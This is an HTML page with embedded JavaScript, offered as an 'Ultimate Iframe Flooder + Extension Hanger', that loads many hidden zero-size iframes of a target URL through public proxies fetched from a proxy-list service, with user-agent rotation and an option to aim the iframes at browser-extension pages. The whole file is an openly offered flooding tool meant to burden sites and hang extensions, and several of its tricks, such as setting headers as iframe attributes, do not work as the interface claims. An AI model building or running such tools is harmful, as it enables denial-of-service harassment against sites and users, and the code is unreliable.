<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Ultimate Iframe Flooder + Extension Hanger</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0d0d0d;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    h1 {
      color: #00ff99;
      margin-top: 20px;
    }
    .container {
      max-width: 900px;
      margin: 20px auto;
      background: #1a1a1a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 20px #00ff99;
    }
    input, button, select, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 5px;
      border: none;
      background: #262626;
      color: #e0e0e0;
      font-size: 16px;
    }
    button {
      background: #00cc66;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: #00ff99;
    }
    button.stop {
      background: #ff1a1a;
    }
    button.stop:hover {
      background: #ff4d4d;
    }
    .stats {
      margin-top: 15px;
      text-align: left;
    }
    .stats span {
      font-weight: bold;
      color: #00ff99;
    }
    #iframeContainer {
      display: none;
    }
  </style>
</head>
<body>

  <h1>Ultimate Iframe Flooder + Extension Hanger</h1>

  <div class="container">
    <input type="text" id="targetUrl" placeholder="Target URL" value="https://www.wikipedia.org">

    <input type="number" id="iframeCount" placeholder="Number of Iframes" value="50" min="1">

    <input type="number" id="delay" placeholder="Delay (seconds)" value="1" min="0">

    <textarea id="headers" placeholder="Custom Headers (one per line)"></textarea>

    <select id="extensionTarget">
      <option value="all">All Extensions</option>
    </select>

    <input type="checkbox" id="userAgentRotation"> Enable User-Agent Rotation

    <input type="number" id="autoStopTimer" placeholder="Auto Stop Timer (seconds)" value="60" min="0">

    <button onclick="startFlood()">Start Flooding</button>
    <button class="stop" onclick="stopFlood()">Stop Flooding</button>

    <div class="stats">
      <p>Frames Generated: <span id="frameCount">0</span></p>
      <p>Failures: <span id="failureCount">0</span></p>
      <p>Proxies Loaded: <span id="proxyCount">0</span></p>
      <p>Current Target: <span id="currentTarget">None</span></p>
    </div>
  </div>

  <script>
    let flooding = false;
    let frameCount = 0;
    let failureCount = 0;
    let proxyList = [];
    let userAgentRotation = false;
    let currentTarget = '';
    let proxiesFetched = false;

    const extensionIds = [
      'extprint3r_id_here', 
      'comet_hang3r_id_here', 
      'another_extension_id_here'
    ];

    async function fetchProxies() {
      try {
        const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all');
        const text = await response.text();
        proxyList = text.trim().split('\n').map(p => p.trim()).filter(p => p.length > 0);
        document.getElementById('proxyCount').innerText = proxyList.length;
        proxiesFetched = true;
      } catch (e) {
        console.error('Failed to fetch proxies:', e);
        proxiesFetched = false;
      }
    }

    function getRandomProxy() {
      if (proxyList.length === 0) return null;
      return proxyList[Math.floor(Math.random() * proxyList.length)];
    }

    function populateExtensionDropdown() {
      const select = document.getElementById('extensionTarget');
      extensionIds.forEach(id => {
        const option = document.createElement('option');
        option.value = `chrome-extension://${id}/`;
        option.text = `Extension: ${id}`;
        select.appendChild(option);
      });
    }

    function getRandomUserAgent() {
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Firefox/89.0"
      ];
      return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    async function startFlood() {
      if (flooding) return;
      flooding = true;
      frameCount = 0;
      failureCount = 0;
      document.getElementById('frameCount').innerText = 0;
      document.getElementById('failureCount').innerText = 0;

      currentTarget = document.getElementById('targetUrl').value;
      userAgentRotation = document.getElementById('userAgentRotation').checked;

      const customHeaders = document.getElementById('headers').value.split('\n').map(h => h.trim()).filter(h => h);
      const delay = parseInt(document.getElementById('delay').value) * 1000;

      if (!proxiesFetched) await fetchProxies();

      floodIframes(currentTarget, delay, customHeaders);

      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
      if (autoStopTime > 0) {
        setTimeout(stopFlood, autoStopTime);
      }
    }

    function floodIframes(target, delay, customHeaders) {
      const iframeCount = parseInt(document.getElementById('iframeCount').value);
      const extensionTarget = document.getElementById('extensionTarget').value;

      for (let i = 0; i < iframeCount; i++) {
        setTimeout(() => {
          loadIframe(extensionTarget !== "all" ? extensionTarget : target, customHeaders);
        }, delay * i);
      }
    }

    function loadIframe(target, customHeaders) {
      try {
        const iframe = document.createElement('iframe');
        iframe.style.width = "0";
        iframe.style.height = "0";
        iframe.style.border = "none";

        if (userAgentRotation) {
          const randomAgent = getRandomUserAgent();
          iframe.setAttribute('user-agent', randomAgent);
        }

        customHeaders.forEach(header => {
          const [key, value] = header.split(':');
          if (key && value) {
            iframe.setAttribute(key.trim(), value.trim());
          }
        });

        const proxy = getRandomProxy();
        if (proxy) {
          iframe.src = `http://${proxy}/${target}`;
        } else {
          iframe.src = target;
        }

        document.body.appendChild(iframe);

        frameCount++;
        document.getElementById('frameCount').innerText = frameCount;
        document.getElementById('currentTarget').innerText = target;
      } catch (err) {
        failureCount++;
        document.getElementById('failureCount').innerText = failureCount;
      }
    }

    function stopFlood() {
      flooding = false;
      document.getElementById('currentTarget').innerText = "Stopped";
    }

    window.onload = populateExtensionDropdown;
    setInterval(fetchProxies, 300000); // Refresh proxies every 5 min
  </script>

</body>
</html>
